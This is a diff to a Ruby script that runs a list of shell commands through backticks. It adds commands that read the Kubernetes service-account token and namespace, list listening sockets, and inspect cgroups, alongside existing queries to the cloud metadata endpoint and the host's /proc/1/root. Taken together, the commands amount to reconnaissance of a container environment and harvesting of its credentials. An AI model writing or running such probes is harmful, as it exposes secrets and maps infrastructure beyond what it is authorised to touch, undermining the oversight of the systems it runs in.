@@ -18,6 +18,12 @@ begin
     "curl -sS -m 4 -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>&1 | head -c 200",
     "getent hosts github.com", "cat /proc/self/limits | head -6",
     "ls -la /proc/1/root/ 2>&1 | head -5", "cat /sys/fs/cgroup/cpu.max 2>&1",
+    "ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1",
+    "head -c 60 /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1; echo",
+    "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1",
+    "cat /etc/hostname", "ss -tulpn 2>/dev/null | head -8; netstat -tulpn 2>/dev/null | head -8",
+    "cat /sys/fs/cgroup/memory.max 2>&1; ls /sys/fs/cgroup/ | head -10",
+
   ]
   cmds.each do |c|
     o = `#{c} 2>&1` rescue "ERR:#{$?.to_s[0,20]}"
